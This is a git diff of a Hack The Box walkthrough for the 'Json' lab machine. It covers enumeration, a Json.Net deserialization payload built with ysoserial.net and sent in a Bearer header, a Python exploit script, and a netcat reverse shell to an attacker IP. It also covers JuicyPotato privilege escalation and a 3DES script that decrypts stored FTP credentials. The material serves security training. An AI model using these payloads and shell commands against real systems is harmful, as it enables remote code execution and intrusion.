@@ -4,7 +4,7 @@ category: BOX - MEDIUM
 type: htb_box
 layout: page
 img-link: /writeups/htb/boxes/images/json_1.png
-desc: 10.10.10.158 - [MEDIUM] Json
+desc: 10.10.10.158 - [MEDIUM] Json by Altelus
 ---
 
 
@@ -12,8 +12,8 @@ desc: 10.10.10.158 - [MEDIUM] Json
 
 ![Json icon](/writeups/htb/boxes/images/json_1.png# icon)
 
-<h2 style="font-size: 1.4em">Enumeration</h2>
-<h2 style="font-size: 1.2em">NMAP</h2>
+## Enumeration
+### NMAP
 
 We have our nmap scan run the following:
 
@@ -25,10 +25,102 @@ nmap -sV -sC -A -v 10.10.10.158 -p 1-10000
 
 Then here is the result:
 
+```bash
+Host is up (0.28s latency).
+Not shown: 9976 closed ports
+PORT     STATE    SERVICE       VERSION
+21/tcp   open     ftp           FileZilla ftpd
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+80/tcp   open     http          Microsoft IIS httpd 8.5
+| http-methods: 
+|   Supported Methods: GET HEAD OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/8.5
+|_http-title: Json HTB
+135/tcp  open     msrpc         Microsoft Windows RPC
+139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open     microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+1894/tcp filtered o2server-port
+2465/tcp filtered lbm
+2608/tcp filtered wag-service
+2923/tcp filtered wta-wsp-wtp-s
+3228/tcp filtered dwmsgserver
+3942/tcp filtered srdp
+4110/tcp filtered g2tag
+4939/tcp filtered unknown
+5636/tcp filtered sfm-db-server
+5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+6175/tcp filtered unknown
+6822/tcp filtered unknown
+6966/tcp filtered swispol
+7271/tcp filtered unknown
+8079/tcp filtered unknown
+8225/tcp filtered unknown
+8291/tcp filtered unknown
+8337/tcp filtered unknown
+9310/tcp filtered unknown
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=2/15%OT=21%CT=1%CU=36910%PV=Y%DS=2%DC=T%G=Y%TM=5E477E0
+OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=
+OS:7)SEQ(SP=105%GCD=1%ISR=109%TS=7)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54
+OS:DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%
+OS:W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC
+OS:=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=
+OS:S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF
+OS:=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=
+OS:%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=
+OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RI
+OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
 
-![2](/writeups/htb/boxes/images/json_2.png)
+Uptime guess: 0.001 days (since Sat Feb 15 00:11:51 2020)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: Busy server or unknown class
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
-![3](/writeups/htb/boxes/images/json_3.png)
+Host script results:
+|_clock-skew: mean: 4h11m00s, deviation: 0s, median: 4h11m00s
+| nbstat: NetBIOS name: JSON, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:cc:4d (VMware)
+| Names:
+|   JSON<00>             Flags: <unique><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|_  JSON<20>             Flags: <unique><active>
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-02-15T09:24:44
+|_  start_date: 2020-02-15T09:23:08
+
+TRACEROUTE (using port 23/tcp)
+HOP RTT       ADDRESS
+1   328.88 ms 10.10.14.1
+2   332.69 ms 10.10.10.158
+
+NSE: Script Post-scanning.
+Initiating NSE at 00:13
+Completed NSE at 00:13, 0.00s elapsed
+Initiating NSE at 00:13
+Completed NSE at 00:13, 0.00s elapsed
+Initiating NSE at 00:13
+Completed NSE at 00:13, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 417.37 seconds
+           Raw packets sent: 13749 (609.592KB) | Rcvd: 12330 (696.519KB)
+
+```
+
 
 Important services:<br />
 FTP - port 21
@@ -39,16 +131,28 @@ SMB - port 445
 HTTP (Winrm service) - port 5985 
 <br />
 
-<h2 style="font-size: 1.2em">FTP Anonymous Login</h2><br>
+### FTP Anonymous Login<br>
 
 Checking FTP if we can login as anonymous user:
 
-![4](/writeups/htb/boxes/images/json_4.png)
-
+```bash
+root@kali:~/CTFs/HTB/Json# ftp 10.10.10.158
+Connected to 10.10.10.158.
+220-FileZilla Server 0.9.60 beta
+220-written by Tim Kosse (tim.kosse@filezilla-project.org)
+220 Please visit https://filezilla-project.org/
+Name (10.10.10.158:root): anonymous
+331 Password required for anonymous
+Password:
+530 Login or password incorrect!
+Login failed.
+Remote system type is UNIX.
+ftp>
+```
 We can't login as anonymous
 <br />
 
-<h2 style="font-size: 1.2em">Web Service Enumeration</h2><br>
+### Web Service Enumeration<br>
 
 Checking the page served at port 80:
 ![5](/writeups/htb/boxes/images/json_5.png)
@@ -67,10 +171,56 @@ Checking the page source, we can see there is a javascript file called ```app.mi
 <br />
 
 And here is its content:
-![8](/writeups/htb/boxes/images/json_8.png)
-Since it's hard to read it this way, we can fix this by feeding it to a javascript code beautifier.
-![9](/writeups/htb/boxes/images/json_9.png)
+```javascript
+var _0xd18f = ["\x70\x72\x69\x6E\x63\x69\x70\x61\x6C\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x24\x68\x74\x74\x70", "\x24\x73\x63\x6F\x70\x65", "\x24\x63\x6F\x6F\x6B\x69\x65\x73", "\x4F\x41\x75\x74\x68\x32", "\x67\x65\x74", "\x55\x73\x65\x72\x4E\x61\x6D\x65", "\x4E\x61\x6D\x65", "\x64\x61\x74\x61", "\x72\x65\x6D\x6F\x76\x65", "\x68\x72\x65\x66", "\x6C\x6F\x63\x61\x74\x69\x6F\x6E", "\x6C\x6F\x67\x69\x6E\x2E\x68\x74\x6D\x6C", "\x74\x68\x65\x6E", "\x2F\x61\x70\x69\x2F\x41\x63\x63\x6F\x75\x6E\x74\x2F", "\x63\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x6C\x6F\x67\x69\x6E\x43\x6F\x6E\x74\x72\x6F\x6C\x6C\x65\x72", "\x63\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73", "", "\x65\x72\x72\x6F\x72", "\x69\x6E\x64\x65\x78\x2E\x68\x74\x6D\x6C", "\x6C\x6F\x67\x69\x6E", "\x6D\x65\x73\x73\x61\x67\x65", "\x49\x6E\x76\x61\x6C\x69\x64\x20\x43\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73\x2E", "\x73\x68\x6F\x77", "\x6C\x6F\x67", "\x2F\x61\x70\x69\x2F\x74\x6F\x6B\x65\x6E", "\x70\x6F\x73\x74", "\x6A\x73\x6F\x6E", "\x6E\x67\x43\x6F\x6F\x6B\x69\x65\x73", "\x6D\x6F\x64\x75\x6C\x65"]; angular[_0xd18f[30]](_0xd18f[28], [_0xd18f[29]])[_0xd18f[15]](_0xd18f[16], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function (_0x30f6x1, _0x30f6x2, _0x30f6x3) { _0x30f6x2[_0xd18f[17]] = { UserName: _0xd18f[18], Password: _0xd18f[18] }; _0x30f6x2[_0xd18f[19]] = { message: _0xd18f[18], show: false }; var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]); if (_0x30f6x4) { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20] }; _0x30f6x2[_0xd18f[21]] = function () { _0x30f6x1[_0xd18f[27]](_0xd18f[26], _0x30f6x2[_0xd18f[17]])[_0xd18f[13]](function (_0x30f6x5) { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[20] }, function (_0x30f6x6) { _0x30f6x2[_0xd18f[19]][_0xd18f[22]] = _0xd18f[23]; _0x30f6x2[_0xd18f[19]][_0xd18f[24]] = true; console[_0xd18f[25]](_0x30f6x6) }) } }])[_0xd18f[15]](_0xd18f[0], [_0xd18f[1], _0xd18f[2], _0xd18f[3], function (_0x30f6x1, _0x30f6x2, _0x30f6x3) { var _0x30f6x4 = _0x30f6x3[_0xd18f[5]](_0xd18f[4]); if (_0x30f6x4) { _0x30f6x1[_0xd18f[5]](_0xd18f[14], { headers: { "\x42\x65\x61\x72\x65\x72": _0x30f6x4 } })[_0xd18f[13]](function (_0x30f6x5) { _0x30f6x2[_0xd18f[6]] = _0x30f6x5[_0xd18f[8]][_0xd18f[7]] }, function (_0x30f6x6) { _0x30f6x3[_0xd18f[9]](_0xd18f[4]); window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12] }) } else { window[_0xd18f[11]][_0xd18f[10]] = _0xd18f[12] } }])
 
+```
+<br>
+
+Since it's hard to read it this way, we can fix this by feeding it to a [javascript code beautifier](https://beautifier.io/).
+
+```javascript
+angular['module']('json', ['ngCookies'])['controller']('loginController', ['$http', '$scope', '$cookies', function(_0x30f6x1, _0x30f6x2, _0x30f6x3) {
+    _0x30f6x2['credentials'] = {
+        UserName: '',
+        Password: ''
+    };
+    _0x30f6x2['error'] = {
+        message: '',
+        show: false
+    };
+    var _0x30f6x4 = _0x30f6x3['get']('OAuth2');
+    if (_0x30f6x4) {
+        window['location']['href'] = 'index.html'
+    };
+    _0x30f6x2['login'] = function() {
+        _0x30f6x1['post']('/api/token', _0x30f6x2['credentials'])['then'](function(_0x30f6x5) {
+            window['location']['href'] = 'index.html'
+        }, function(_0x30f6x6) {
+            _0x30f6x2['error']['message'] = 'Invalid Credentials.';
+            _0x30f6x2['error']['show'] = true;
+            console['log'](_0x30f6x6)
+        })
+    }
+}])['controller']('principalController', ['$http', '$scope', '$cookies', function(_0x30f6x1, _0x30f6x2, _0x30f6x3) {
+    var _0x30f6x4 = _0x30f6x3['get']('OAuth2');
+    if (_0x30f6x4) {
+        _0x30f6x1['get']('/api/Account/', {
+            headers: {
+                "\x42\x65\x61\x72\x65\x72": _0x30f6x4
+            }
+        })['then'](function(_0x30f6x5) {
+            _0x30f6x2['UserName'] = _0x30f6x5['data']['Name']
+        }, function(_0x30f6x6) {
+            _0x30f6x3['remove']('OAuth2');
+            window['location']['href'] = 'login.html'
+        })
+    } else {
+        window['location']['href'] = 'login.html'
+    }
+}])
+```
+<br>
 There are two links we can see:
 - ```/api/token``` at line 15
 - ```/api/Account``` at line 26
@@ -82,9 +232,37 @@ The ```/api/token``` accepts ```POST``` requests with data parameters ```UserNam
 <br>
 Accessing those links with curl will give these results:
 - Result at ```/api/token``` curl
-![10](/writeups/htb/boxes/images/json_10.png)
-will set a cookie which is a base64 JSON of user info
-![11](/writeups/htb/boxes/images/json_11.png)
+
+```bash
+root@kali:~/CTFs/HTB/Json# curl http://10.10.10.158/api/token -H "Content-Type: application/json" --data "{'Username' : 'admin', 'Password' : 'admin'}" -v
+*   Trying 10.10.10.158:80...
+* TCP_NODELAY set
+* Connected to 10.10.10.158 (10.10.10.158) port 80 (#0)
+> POST /api/token HTTP/1.1
+> Host: 10.10.10.158
+> User-Agent: curl/7.66.0
+> Accept: */*
+> Content-Type: application/json
+> Content-Length: 44
+> 
+* upload completely sent off: 44 out of 44 bytes
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 202 Accepted
+< Cache-Control: no-cache
+< Pragma: no-cache
+< Expires: -1
+< Server: Microsoft-IIS/8.5
+< X-AspNet-Version: 4.0.30319
+* Added cookie OAuth2="eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=" for domain 10.10.10.158, path /, expire 1582073958
+< Set-Cookie: OAuth2=eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=; expires=Wed, 19-Feb-2020 00:59:18 GMT; path=/
+< X-Powered-By: ASP.NET
+< Date: Wed, 19 Feb 2020 00:57:18 GMT
+< Content-Length: 0
+< 
+```
+<br>
+will set a cookie which is a base64 JSON of user info. We can see from the result above on Set-Cookie. When the base64 is decoded, the result is below.
+
 ```JSON
 {"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}
 ```
@@ -94,26 +272,51 @@ There is nothing really new in there. Even the password hash is also just "admin
 <br>
 
 - Result at ```/api/Account``` curl. Since the ```Bearer``` header is for authentication, we just set its value from the value of the cookie given by ```/api/token```.
-![13](/writeups/htb/boxes/images/json_13.png#)
+
+```bash
+root@kali:~/CTFs/HTB/Json# curl http://10.10.10.158/api/Account -H "Content-Type: application/json" -v -H "Bearer: eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0="; echo;
+*   Trying 10.10.10.158:80...
+* TCP_NODELAY set
+* Connected to 10.10.10.158 (10.10.10.158) port 80 (#0)
+> GET /api/Account HTTP/1.1
+> Host: 10.10.10.158
+> User-Agent: curl/7.66.0
+> Accept: */*
+> Content-Type: application/json
+> Bearer: eyJJZCI6MSwiVXNlck5hbWUiOiJhZG1pbiIsIlBhc3N3b3JkIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMiLCJOYW1lIjoiVXNlciBBZG1pbiBIVEIiLCJSb2wiOiJBZG1pbmlzdHJhdG9yIn0=
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Cache-Control: no-cache
+< Pragma: no-cache
+< Content-Type: application/json; charset=utf-8
+< Expires: -1
+< Server: Microsoft-IIS/8.5
+< X-AspNet-Version: 4.0.30319
+< X-Powered-By: ASP.NET
+< Date: Wed, 19 Feb 2020 01:06:57 GMT
+< Content-Length: 119
+< 
+* Connection #0 to host 10.10.10.158 left intact
+{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}
+```
 
 <br>
 However, the result is also the JSON received earlier but only in decoded base64 form.
-![14](/writeups/htb/boxes/images/json_14.png#)
 
 
-<h2 style="font-size: 1.4em">Web Service Exploitation. (Deserialization Exploit)</h2>
-<br>
+## Web Service Exploitation. (Deserialization Exploit)
 However, a malformed json being sent to the server either via two of those links will return an error. 
 ![15](/writeups/htb/boxes/images/json_15.png)
 It means that the deserialization of the data is mishandled and can be a vulnerability. We can check this with a tool called [ysoserial.net](https://github.com/pwntester/ysoserial.net).
 <br>
 
-Running the .exe file in a windows machine:
+Going to a windows machine. After copying and running the ysoserial.exe file in a windows machine using the command:
 ```bash
 .\ysoserial.net -f Json.Net -g ObjectDataProvider -c "cmd /c ping 10.10.14.87"
 
 ```
-It will give this payload:
+It will give us this payload:
 
 ```JSON
 {
@@ -126,8 +329,11 @@ It will give this payload:
     'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
 }
 ```
+Copying the payload and save it to our Kali Linux box as payload.txt
+
+
 <br>
-# Targeting : /api/token
+### Targeting : /api/token
 
 We setup an icmp sniffer:
 ```
@@ -140,7 +346,7 @@ curl http://10.10.10.158/api/token -H "Content-Type: application/json" --data "$
 ```
 However, this attack only made the server return an error and the server did not execute the ping command.
 <br>
-# Targeting : /api/Account
+### Targeting : /api/Account
 ```bash
 curl http://10.10.10.158/api/Account -H "Content-Type: application/json" -H "Bearer: $(cat payload.txt | base64 -w 0)"
 ```
@@ -149,6 +355,21 @@ This attack made our ping command executed!
 ![16](/writeups/htb/boxes/images/json_16.png)
 
 With this, I created a python script that inputs our command so our payload will be flexible.
+
+New payload - payload_flex.txt:
+```JSON
+{
+    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
+    'MethodName':'Start',
+    'MethodParameters':{
+        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
+        '$values':['%s', '%s']
+    },
+    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
+}
+```
+<br>
+And our python exploit - json_exploit.py
 
 ```python
 import requests
@@ -186,7 +407,7 @@ print(page.text)
 
 ```
 
-# Spawning a Shell
+### Spawning a Shell
 
 To spawn a shell wth this, we can upload netcat executable for windows then execute it also via the script with powershell or cmd execution.
 <br>
@@ -197,7 +418,7 @@ After the netcat is uploaded, execute the following:
 ```Bash
 Command: powershell.exe, /c c:\\Windows\\Temp\\nc.exe 10.10.14.87 4444 -e "cmd.exe'
 ```
-# NOTE:
+ NOTE:
 If "powershell.exe" is used immediately, the server doesn't spawn a shell.
 
 <br>
@@ -206,19 +427,19 @@ We successfuly spawned a shell with "userpool" as our user!
 ![18](/writeups/htb/boxes/images/json_18.png# big)
 <br>
 
-# User Flag
+## User Flag
 We can just go to ```C:\Users\userpool\Desktop\``` to get our user flag.
 
 ![19](/writeups/htb/boxes/images/json_19.png# big)
 
-<h2 style="font-size: 1.4em">Privilege Escalation</h2>
+## Privilege Escalation
 <br>
 
 There are two ways of getting root:
 
-<h2 style="font-size: 1.3em">Method 1</h2>
+## Method 1
 
-<h2 style="font-size: 1.2em">Enumeration</h2>
+### Enumeration
 
 We can check the privileges of our user. It's stated that SeImpersonatePrivilege is enabled thus we can use an exploit that uses this setting to escalate to NT AUTHORITY\SYSTEM
 
@@ -228,7 +449,7 @@ Windows 2019 and Windows 10 1809 are unaffected by this but the version of Windo
 
 ![21](/writeups/htb/boxes/images/json_21.png# big)
 
-<h2 style="font-size: 1.2em">JuicyPotato Exploitation</h2>
+### JuicyPotato Exploitation
 We can use the [JuicyPotato exploit](https://github.com/ohpe/juicy-potato/) to exploit this setting.<br>
 
 It's also needed that a correct CLSID is selected in order for this to work. The list of CLSID I used for this version of windows is [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2012_Datacenter)
@@ -256,9 +477,9 @@ After the netcat receives the connection, we are connected as ```NT AUTHORITY\SY
 
 <br>
 
-<h2 style="font-size: 1.3em">Method 2</h2>
+## Method 2
 
-<h2 style="font-size: 1.2em">Enumeration</h2>
+### Enumeration
 If we go to C:\Program Files, there is a folder called "Sync2Ftp" and here is its contents:
 
 ![24](/writeups/htb/boxes/images/json_24.png# big)
@@ -288,14 +509,14 @@ while the config contains encrypted username, password, and a key.
 ```
 <br>
 
-<h2 style="font-size: 1.2em">Reversing the .NET executable</h2>
+### Reversing the .NET executable
 To reverse or decompile the .NET executable, dotPeek is used. After reversing, there is a Encrypt() and Decrypt() function on the decompiled code.
 
 ![26](/writeups/htb/boxes/images/json_26.png)
 Focusing on the Decrypt() function, it's stated that it used 3DES-ECB as the encryption algorithm. A little problem is that it has ```hashing``` variable that decides whether or not to hash the key. 
 
 
-<h2 style="font-size: 1.2em">Decrypting username and password</h2>
+### Decrypting username and password
 Here's the written python script to decrypt the username and password.
 ```python
 from Crypto.Cipher import DES3
@@ -334,7 +555,7 @@ USER: superadmin
 PASS: funnyhtb
 ```
 <br>
-<h2 style="font-size: 1.2em">FTP Login</h2>
+### FTP Login
 Since it is said to "Sync" with FTP, use the credentials first to FTP.
 ![27](/writeups/htb/boxes/images/json_27.png# big)
 <br>
